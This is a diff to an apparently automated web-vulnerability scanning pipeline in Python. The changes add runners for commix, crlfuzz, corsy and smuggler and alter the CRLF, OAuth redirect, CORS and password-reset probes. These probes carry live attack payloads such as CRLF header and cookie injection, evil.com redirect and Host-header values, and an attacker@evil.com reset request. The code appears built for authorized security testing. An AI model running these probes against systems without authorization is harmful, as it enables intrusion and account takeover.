-                    results.append(f"[active-blocked] {url} → HTTP {awaf_status} with payload: {payload[:40]}")
-                    break
                 body = awaf_body.decode("utf-8", errors="ignore").lower()
                 if any(kw in body for kw in ("blocked", "denied", "rejected", "waf", "security")):
                     results.append(f"[active-blocked-content] {url} → waf keyword in response for payload: {payload[:40]}")
@@ -4663,6 +4796,7 @@ async def phase_23_RACE(
     findings: List[str] = []
     _r_urlopen = _get_urlopener()
     _r_extra_headers = _extra_headers_dict()
+    _race_sem = asyncio.Semaphore(20)
     # Target state-changing endpoints from 05-HARVEST: POST/PUT/DELETE with financial or quota keywords
     state_change_keywords = ("redeem", "transfer", "purchase", "vote", "checkout", "payment", "order",
                             "withdraw", "deposit", "refund", "cancel", "subscribe", "upgrade", "downgrade",
@@ -4684,14 +4818,15 @@ async def phase_23_RACE(
         responses: List[int] = []
         body_lens: List[int] = []
         async def _concurrent_req() -> None:
-            try:
-                req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
-                s, _, b = await _async_urlopen(_r_urlopen, req, timeout=10)
-                responses.append(s)
-                body_lens.append(len(b))
-            except Exception:
-                responses.append(0)
-                body_lens.append(0)
+            async with _race_sem:
+                try:
+                    req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
+                    s, _, b = await _async_urlopen(_r_urlopen, req, timeout=10)
+                    responses.append(s)
+                    body_lens.append(len(b))
+                except Exception:
+                    responses.append(0)
+                    body_lens.append(0)
         coros = [_concurrent_req() for _ in range(5)]
         await asyncio.gather(*coros)
         unique_st = len(set(responses))
@@ -4720,18 +4855,20 @@ async def phase_23_RACE(
             read_qs[first_param] = [orig_val]
             read_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(read_qs, doseq=True)))
             async def _write_first() -> None:
-                try:
-                    w_req = urllib.request.Request(write_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
-                    await _async_urlopen(_r_urlopen, w_req, timeout=10)
-                except Exception:
-                    pass
+                async with _race_sem:
+                    try:
+                        w_req = urllib.request.Request(write_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
+                        await _async_urlopen(_r_urlopen, w_req, timeout=10)
+                    except Exception:
+                        pass
             async def _read_first() -> Tuple[Optional[int], int]:
-                try:
-                    r_req = urllib.request.Request(read_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
-                    rs, _, rb = await _async_urlopen(_r_urlopen, r_req, timeout=10)
-                    return rs, len(rb)
-                except Exception:
-                    return None, 0
+                async with _race_sem:
+                    try:
+                        r_req = urllib.request.Request(read_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_r_extra_headers})
+                        rs, _, rb = await _async_urlopen(_r_urlopen, r_req, timeout=10)
+                        return rs, len(rb)
+                    except Exception:
+                        return None, 0
             write_task = asyncio.create_task(_write_first())
             read_tasks = [_read_first() for _ in range(3)]
             read_results = await asyncio.gather(*read_tasks)
@@ -4946,6 +5083,28 @@ async def phase_26_CMDINJECT(
     _c_urlopen = _get_urlopener()
     _cmdi_extra_headers = _extra_headers_dict()
     param_urls = [u for u in all_urls if "=" in u][:_PIPELINE_CFG.sample_urls_cmdi]
+    if t.has("commix") and param_urls:
+        commix_outdir = outdir / "logs" / "commix"
+        commix_outdir.mkdir(parents=True, exist_ok=True)
+        for u in param_urls:
+            runner = outdir / "logs" / f"commix_{_safe_name(u)}_runner.sh"
+            ensure(runner)
+            runner.write_text(
+                "#!/usr/bin/env bash\n"
+                "set -eu\n"
+                f"URL={shlex.quote(u)}\n"
+                f"OUT={shlex.quote(str(commix_outdir))}\n"
+                'commix -u "$URL" --batch --output-dir="$OUT" 2>/dev/null || true\n'
+            )
+            runner.chmod(0o755)
+            await _run(
+                f"commix-{_safe_name(u)}",
+                ["bash", str(runner)],
+                600, outdir,
+            )
+        commix_reports = list(commix_outdir.glob("**/*.txt"))
+        if commix_reports:
+            findings.append(f"[commix] {len(commix_reports)} report files → {commix_outdir}")
     for u in param_urls:
         parsed = urllib.parse.urlparse(u)
         qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
@@ -5271,9 +5430,15 @@ async def phase_30_LFI(
                 continue
             for payload in lfi_payloads[:_PIPELINE_CFG.sample_endpoints_post]:
                 await _throttle_rate()
-                test_qs = qs.copy()
-                test_qs[pname] = [payload]
-                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
+                encoded_payload = urllib.parse.quote(payload, safe='')
+                query_parts = []
+                for k, vals in qs.items():
+                    for v in vals:
+                        if k == pname:
+                            query_parts.append(f"{urllib.parse.quote_plus(k)}={encoded_payload}")
+                        else:
+                            query_parts.append(f"{urllib.parse.quote_plus(k)}={urllib.parse.quote_plus(v)}")
+                new_qs = '&'.join(query_parts)
                 test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                 try:
                     req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_lfi_extra_headers})
@@ -5360,7 +5525,7 @@ async def phase_31_OPENREDIR(
                     test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                     try:
                         req = urllib.request.Request(test_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_or_extra_headers})
-                        resp_status, resp_headers, _ = await _async_urlopen(_or_urlopen, req, timeout=10)
+                        resp_status, resp_headers, _ = await _async_urlopen_no_redirect(_or_urlopen, req, timeout=10)
                         location = resp_headers.get("Location", "")
                         if not location:
                             location = resp_headers.get("location", "")
@@ -5428,11 +5593,11 @@ async def phase_32_CLICKJACK(
 
 # ────────────────── Phase 33-CRLF: CRLF Injection Detection ────────────────────
 _CRLF_PAYLOADS = [
-    ("%0d%0aX-Injected:%20yes", "X-Injected"),
-    ("%0d%0aX-Injected:%20yes%0d%0a", "X-Injected"),
-    ("%0aX-Injected:%20yes", "X-Injected"),
-    ("%0d%0a%0d%0a<html>injected</html>", "injected"),
-    ("%0d%0aSet-Cookie:%20crlf=injected", "crlf=injected"),
+    ("\r\nX-Injected: yes", "X-Injected"),
+    ("\r\nX-Injected: yes\r\n", "X-Injected"),
+    ("\nX-Injected: yes", "X-Injected"),
+    ("\r\n\r\n<html>injected</html>", "injected"),
+    ("\r\nSet-Cookie: crlf=injected", "crlf=injected"),
 ]
 
 
@@ -5454,6 +5619,24 @@ async def phase_33_CRLF(
     _crlf_urlopen = _get_urlopener()
     _crlf_extra_headers = _extra_headers_dict()
     param_urls = [u for u in all_urls if "=" in u][:_PIPELINE_CFG.sample_urls_crlf]
+    if t.has("crlfuzz") and param_urls:
+        crlfuzz_in = ensure(outdir / "crlfuzz_input.txt")
+        crlfuzz_in.write_text("\n".join(param_urls) + "\n")
+        crlfuzz_out = outdir / "crlfuzz_results.txt"
+        runner = outdir / "logs" / "crlfuzz_runner.sh"
+        ensure(runner)
+        runner.write_text(
+            "#!/usr/bin/env bash\n"
+            "set -eu\n"
+            f"IN={shlex.quote(str(crlfuzz_in))}\n"
+            f"OUT={shlex.quote(str(crlfuzz_out))}\n"
+            'crlfuzz -l "$IN" -o "$OUT" 2>/dev/null || true\n'
+        )
+        runner.chmod(0o755)
+        await _run("crlfuzz", ["bash", str(runner)], 600, outdir)
+        if crlfuzz_out.exists() and read_lines(crlfuzz_out):
+            for ln in read_lines(crlfuzz_out):
+                findings.append(f"[crlfuzz] {ln.strip()}")
     for u in param_urls:
         parsed = urllib.parse.urlparse(u)
         qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
@@ -5467,7 +5650,7 @@ async def phase_33_CRLF(
                 test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                 try:
                     req = urllib.request.Request(test_url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_crlf_extra_headers})
-                    resp_status, resp_headers, resp_body = await _async_urlopen(_crlf_urlopen, req, timeout=10)
+                    resp_status, resp_headers, resp_body = await _async_urlopen_no_redirect(_crlf_urlopen, req, timeout=10)
                     body_str = resp_body.decode("utf-8", errors="ignore")
                     if indicator in body_str:
                         findings.append(f"[crlf-injection] {test_url} via {param_name} payload={payload} -> {indicator} reflected")
@@ -5517,7 +5700,7 @@ async def phase_34_RATELIMIT(
             for _ in range(_burst_size):
                 await _throttle_rate()
                 req = urllib.request.Request(url, method="GET", headers={"User-Agent": "Mozilla/5.0", **_rl_extra_headers})
-                s, resp_h, _ = await _async_urlopen(_rl_urlopen, req, timeout=8)
+                s, resp_h, _ = await _async_urlopen_no_redirect(_rl_urlopen, req, timeout=8)
                 statuses.append(s)
                 if s in (429, 503) or "retry-after" in str(resp_h).lower():
                     findings.append(f"[rate-limit-detected] {url} — rate limited after {len(statuses)} requests (HTTP {s})")
@@ -5558,6 +5741,25 @@ async def phase_35_CORSADV(
     if not api_endpoints:
         log("warn", "35-CORSADV: no endpoints; skipping")
         return {"35-CORSADV": str(_out), "count": 0}
+    # Corsy CORS misconfiguration scanner
+    if t.has("corsy") and api_endpoints:
+        corsy_in = ensure(outdir / "corsy_input.txt")
+        corsy_in.write_text("\n".join(api_endpoints) + "\n")
+        corsy_out = outdir / "corsy_results.txt"
+        runner = outdir / "logs" / "corsy_runner.sh"
+        ensure(runner)
+        runner.write_text(
+            "#!/usr/bin/env bash\n"
+            "set -eu\n"
+            f"IN={shlex.quote(str(corsy_in))}\n"
+            f"OUT={shlex.quote(str(corsy_out))}\n"
+            'corsy -i "$IN" -o "$OUT" 2>/dev/null || true\n'
+        )
+        runner.chmod(0o755)
+        await _run("corsy", ["bash", str(runner)], 600, outdir)
+        if corsy_out.exists() and read_lines(corsy_out):
+            for ln in read_lines(corsy_out):
+                findings.append(f"[corsy] {ln.strip()}")
     _CORS_TEST_ORIGINS = [
         "https://evil.com",
         "https://sub.evil.com",
@@ -5570,7 +5772,7 @@ async def phase_35_CORSADV(
         try:
             req = urllib.request.Request(url, method="OPTIONS",
                 headers={"User-Agent": "Mozilla/5.0", "Origin": origin, **_cors_extra_headers})
-            _, ch, _ = await _async_urlopen(_cors_urlopen, req, timeout=8)
+            _, ch, _ = await _async_urlopen_no_redirect(_cors_urlopen, req, timeout=8)
             acao = ch.get("Access-Control-Allow-Origin", "")
             acac = ch.get("Access-Control-Allow-Credentials", "")
             acm = ch.get("Access-Control-Allow-Methods", "")
@@ -5714,7 +5916,7 @@ async def phase_37_FILEUPLOAD(
         for ln in read_lines(fuzz_file):
             low = ln.lower()
             if any(m in low for m in ("/upload", "/file", "/import", "/attach", "/media", "/image")):
-                upload_candidates.add(ln.split()[0] if " " in ln else ln)
+                upload_candidates.add(ln.split("\t")[-1] if "\t" in ln else (ln.split()[0] if " " in ln else ln))
     targets = list(upload_candidates)[:_PIPELINE_CFG.sample_urls_upload]
     if not targets:
         log("warn", "37-FILEUPLOAD: no upload endpoints found; skipping")
@@ -5808,6 +6010,35 @@ async def phase_38_SMUGGLE(
     if not targets:
         log("warn", "38-SMUGGLE: no hosts; skipping")
         return {"38-SMUGGLE": str(_out), "count": 0}
+    # Smuggler tool (Python-based request smuggler)
+    if t.has("smuggler"):
+        smuggler_in = ensure(outdir / "smuggler_input.txt")
+        smuggler_urls = []
+        for h in targets:
+            if h.startswith("http"):
+                smuggler_urls.append(h)
+            else:
+                smuggler_urls.append(f"https://{h}")
+        smuggler_in.write_text("\n".join(smuggler_urls) + "\n")
+        smuggler_out = outdir / "logs" / "smuggler_results"
+        smuggler_out.mkdir(parents=True, exist_ok=True)
+        runner = outdir / "logs" / "smuggler_runner.sh"
+        ensure(runner)
+        runner.write_text(
+            "#!/usr/bin/env bash\n"
+            "set -eu\n"
+            f"IN={shlex.quote(str(smuggler_in))}\n"
+            f"OUT={shlex.quote(str(smuggler_out))}\n"
+            'smuggler -l "$IN" -o "$OUT" 2>/dev/null || true\n'
+        )
+        runner.chmod(0o755)
+        await _run("smuggler", ["bash", str(runner)], 600, outdir)
+        smuggler_reports = list(smuggler_out.glob("*.txt"))
+        if smuggler_reports:
+            for rpt in smuggler_reports:
+                for ln in read_lines(rpt):
+                    if ln.strip():
+                        findings.append(f"[smuggler] {ln.strip()}")
     for host in targets:
         host_clean = host.split(":")[0] if ":" in host else host
         try:
@@ -5842,7 +6073,7 @@ async def phase_38_SMUGGLE(
                         pass
                     sock.close()
                     resp_text = resp.decode("utf-8", errors="ignore")
-                    if "smuggle-test" in resp_text.lower() or "gpO" in resp_text:
+                    if "smuggle-test" in resp_text.lower() or "gpo" in resp_text.lower():
                         findings.append(f"[smuggling-{smuggle_type}] {host} — desync detected ({smuggle_type})")
                     elif resp and "HTTP/1.1" in resp_text:
                         findings.append(f"[smuggling-tested] {host} — {smuggle_type} test sent, no desync (expected)")
@@ -5903,14 +6134,14 @@ async def phase_39_OAUTH(
         try:
             req = urllib.request.Request(ep_url, method="GET",
                 headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers})
-            s, h, _ = await _async_urlopen(_oa_urlopen, req, timeout=8)
+            s, h, _ = await _async_urlopen_no_redirect(_oa_urlopen, req, timeout=8)
             if s in (200, 201, 302, 301, 405):
                 body_text = ""
                 if s not in (302, 301):
                     try:
                         req2 = urllib.request.Request(ep_url, method="GET",
                             headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers})
-                        _, _, b2 = await _async_urlopen(_oa_urlopen, req2, timeout=8)
+                        _, _, b2 = await _async_urlopen_no_redirect(_oa_urlopen, req2, timeout=8)
                         body_text = b2.decode("utf-8", errors="ignore")
                     except Exception:
                         pass
@@ -5926,13 +6157,13 @@ async def phase_39_OAUTH(
         try:
             req = urllib.request.Request(ep_url + "?response_type=code&client_id=test&redirect_uri=https://evil.com&scope=openid",
                 method="GET", headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers})
-            s, rh, _ = await _async_urlopen(_oa_urlopen, req, timeout=8)
+            s, rh, _ = await _async_urlopen_no_redirect(_oa_urlopen, req, timeout=8)
             loc = rh.get("Location", "")
             if "evil.com" in loc:
                 findings.append(f"[oauth-open-redirect] {ep_url} — redirect_uri accepted https://evil.com")
             req2 = urllib.request.Request(ep_url + "?response_type=code&client_id=test&redirect_uri=https://evil.com%2f.evil2.com&scope=openid",
                 method="GET", headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers})
-            s2, rh2, _ = await _async_urlopen(_oa_urlopen, req2, timeout=8)
+            s2, rh2, _ = await _async_urlopen_no_redirect(_oa_urlopen, req2, timeout=8)
             loc2 = rh2.get("Location", "")
             if "evil2.com" in loc2:
                 findings.append(f"[oauth-redirect-bypass] {ep_url} — redirect_uri parser bypass: %2f.evil2.com")
@@ -6000,7 +6231,7 @@ async def phase_40_PWRESET(
         try:
             req = urllib.request.Request(ep_url, method="GET",
                 headers={"User-Agent": "Mozilla/5.0", **_pw_extra_headers})
-            s, h, b = await _async_urlopen(_pw_urlopen, req, timeout=8)
+            s, h, b = await _async_urlopen_no_redirect(_pw_urlopen, req, timeout=8)
             body_text = b.decode("utf-8", errors="ignore")
             if s in (200, 201, 302, 301):
                 findings.append(f"[pwreset-endpoint] {ep_url} -> HTTP {s}")
@@ -6011,7 +6242,7 @@ async def phase_40_PWRESET(
                             data=b"email=attacker@evil.com",
                             headers={"Content-Type": "application/x-www-form-urlencoded",
                                      "User-Agent": "Mozilla/5.0", **_pw_extra_headers})
-                        s2, _, b2 = await _async_urlopen(_pw_urlopen, req2, timeout=8)
+                        s2, _, b2 = await _async_urlopen_no_redirect(_pw_urlopen, req2, timeout=8)
                         if s2 in (200, 201, 302):
                             findings.append(f"[pwreset-param-pollution] {ep_url} — {pname} accepts email param")
                     except urllib.error.HTTPError:
@@ -6023,7 +6254,7 @@ async def phase_40_PWRESET(
                         data=b"email=test@test.com",
                         headers={"Content-Type": "application/x-www-form-urlencoded",
                                  "Host": "evil.com", **_pw_extra_headers})
-                    s3, h3, _ = await _async_urlopen(_pw_urlopen, host_inject_req, timeout=8)
+                    s3, h3, _ = await _async_urlopen_no_redirect(_pw_urlopen, host_inject_req, timeout=8)
                     loc = h3.get("Location", "") or h3.get("location", "")
                     if "evil.com" in loc:
                         findings.append(f"[pwreset-host-injection] {ep_url} — Host header reflected in Location: {loc}")
@@ -6114,9 +6345,9 @@ async def phase_41_WEBSOCKET(
                         pass
                     sock.close()
                     resp_text = resp.decode("utf-8", errors="ignore")
-                    if "101" in resp_text and "Upgrade: websocket" in resp_text:
+                    if re.search(r'\b101\b', resp_text) and "Upgrade: websocket" in resp_text:
                         findings.append(f"[websocket-open] {ws_url} — WebSocket upgrade accepted (no auth required)")
-                    elif "101" in resp_text:
+                    elif re.search(r'\b101\b', resp_text):
                         findings.append(f"[websocket-found] {ws_url} — WebSocket responded")
                 except Exception:
                     continue
@@ -6163,7 +6394,7 @@ async def phase_42_LDAP(
                 test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                 try:
                     req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_l_extra_headers})
-                    _, _, body_bytes = await _async_urlopen(_l_urlopen, req, timeout=8)
+                    _, _, body_bytes = await _async_urlopen_no_redirect(_l_urlopen, req, timeout=8)
                     body = body_bytes.decode("utf-8", errors="ignore").lower()
                     if any(ind in body for ind in _LDAP42_INDICATORS):
                         findings.append(f"[ldap-candidate] {test_url} param={pname} payload={payload}")
@@ -6224,7 +6455,7 @@ async def phase_43_DESERIAL(
                 req = urllib.request.Request(ep, data=payload, method="POST",
                     headers={"Content-Type": "application/octet-stream",
                              "User-Agent": "Mozilla/5.0", **_d_extra_headers})
-                ds, _, db = await _async_urlopen(_d_urlopen, req, timeout=15)
+                ds, _, db = await _async_urlopen_no_redirect(_d_urlopen, req, timeout=15)
                 body = db.decode("utf-8", errors="ignore").lower()
                 if ds in (500, 502, 503, 504):
                     findings.append(f"[deserial-crash] {ep} {lang} -> HTTP {ds} ({desc})")
@@ -6859,8 +7090,10 @@ PIPELINE = [
 # Stage 1 — DNS resolution after subdomain discovery
 # Later stages keep producer artifacts in earlier stages than their consumers.
 STAGES: List[List[str]] = [
-    # Stage 0 — Scope + subdomain enumeration (no dependencies between them)
-    ["00-SCOPE", "01-RECON"],
+    # Stage 0 — Scope validation (must complete before any discovery)
+    ["00-SCOPE"],
+    # Stage 0a — Subdomain enumeration (consumes scope_validated.txt from Stage 0)
+    ["01-RECON"],
     # Stage 1 — DNS resolution (needs 01-RECON output, which Stage 0 guarantees)
     ["02-RESOLVE"],
     # Stage 2 — Port scanning, WAF detection, subdomain permutation (need resolved hosts/subs)
@@ -6944,8 +7177,10 @@ async def run_pipeline(args: argparse.Namespace) -> int:
     if outdir.exists() and not outdir.is_dir():
         raise ValueError(f"output path exists and is not a directory: {outdir}")
     outdir.mkdir(parents=True, exist_ok=True)
-    # Clean up stale .tmp files from prior crashed atomic writes
+    # Clean up stale .tmp and .ds_tmp files from prior crashed atomic writes
     for tmp in outdir.glob("*.tmp"):
+        tmp.unlink(missing_ok=True)
+    for tmp in outdir.glob("*.ds_tmp"):
         tmp.unlink(missing_ok=True)
     state_path = outdir / "state.json"
     state: Dict[str, Any] = {
